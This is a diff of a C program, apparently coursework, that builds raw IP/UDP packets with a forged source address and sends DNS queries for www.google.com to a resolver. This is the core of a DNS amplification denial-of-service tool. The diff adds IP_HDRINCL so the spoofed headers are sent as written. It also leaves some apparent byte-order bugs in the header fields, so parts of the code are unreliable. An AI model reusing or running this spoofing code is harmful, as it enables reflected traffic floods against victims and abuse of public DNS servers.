@@ -8,16 +8,16 @@ void PrintError(char *error){
 void CreateDnsHeader(dh *dns){
 	// QUERY_ID uses the last 16 bits of my student id, which is defined in dnsamp.h
 	dns->query_id = (unsigned short) htons(QUERY_ID);
-	dns->addrr = 0;
-	dns->anscount = 0;
-	dns->authrr = 0;
 	dns->flags = htons(FLAG_Q);
 	dns->qcount = htons(1);
+	dns->anscount = 0;
+	dns->authrr = 0;
+	dns->addrr = 0;
 }
 
 void CreateQueryInfo(query *q){
-	q->dnsq_class = htons(0x00ff);
 	q->dnsq_type = htons(1);
+	q->dnsq_class = htons(0x00ff);
 }
 
 void CreatePseudoHeader(ph *psheader, char* spoofip, char* dnsip){
@@ -59,13 +59,23 @@ void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	CreateDnsHeader(dnsheader);
 
 	dns_server = (unsigned char *)&dns_data[sizeof(dh)];
-	*dns_server++ = '\4';
-	*dns_server++ = 'a';
-	*dns_server++ = 'r';
-	*dns_server++ = 'p';
-	*dns_server++ = 'a';
+	*dns_server++ = '\3';
+	*dns_server++ = 'w';
+	*dns_server++ = 'w';
+	*dns_server++ = 'w';
+	*dns_server++ = '\6';
+	*dns_server++ = 'g';
+	*dns_server++ = 'o';
+	*dns_server++ = 'o';
+	*dns_server++ = 'g';
+	*dns_server++ = 'l';
+	*dns_server++ = 'e';
+	*dns_server++ = '\3';
+	*dns_server++ = 'c';
+	*dns_server++ = 'o';
+	*dns_server++ = 'm';
 	*dns_server++ = '\0';
-	int length = strlen(dns_server) + 1;
+	int length = 16;
 	query *Query = (query *)&dns_data[(sizeof(dnsheader) + length)];
 	CreateQueryInfo(Query);
 
@@ -76,19 +86,19 @@ void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	din.sin_family = AF_INET;
 	sin.sin_port = htons(53);
 	din.sin_port = htons(port);
-	inet_pton(AF_INET, dnsip, &sin.sin_addr.s_addr);
-	inet_pton(AF_INET, spoofip, &din.sin_addr.s_addr);
+	sin.sin_addr.s_addr = inet_addr(dnsip);
+	din.sin_addr.s_addr = inet_addr(spoofip);
 
 	ih *ipheader = (ih *)buf;
 	ipheader->ihl = 5;
 	ipheader->version = 4;
 	ipheader->tos = 0;
-	ipheader->tot_len = htons(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length);
-	ipheader->id = htons(QUERY_ID);
+	ipheader->tot_len = sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length;
+	ipheader->id = htonl(QUERY_ID);
 	ipheader->ttl = 64;
-	ipheader->protocol = IPPROTO_UDP;
-	inet_pton(AF_INET, spoofip, &ipheader->saddr);
-	inet_pton(AF_INET, dnsip, &ipheader->daddr);
+	ipheader->protocol = 17;
+	ipheader->saddr = inet_addr(spoofip);
+	ipheader->daddr = inet_addr(dnsip);
 	ipheader->check = 0;
 	ipheader->check = CheckIpUdpSum(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length, (unsigned short *)buf);
 
@@ -109,13 +119,21 @@ void SendDnsPacket(char* dnsip, char* spoofip, int port){
 
 	udpheader->check = CheckIpUdpSum(size, (unsigned short *)psdata);
 
+	int one = 1;
+	const int *val = &one;
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sd < 0){
 		printf("sd = %d\n", sd);
 		PrintError("socket error");
 	}
 	else{
-		sendto(sd, buf, ipheader->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+		if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
+		{
+			printf("error\n");	
+			exit(-1);
+		}
+		if(sendto(sd, buf, ipheader->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+			printf("packet send error %d which means %s\n",errno,strerror(errno));
 	}
 	close(sd);
 	free(psdata);
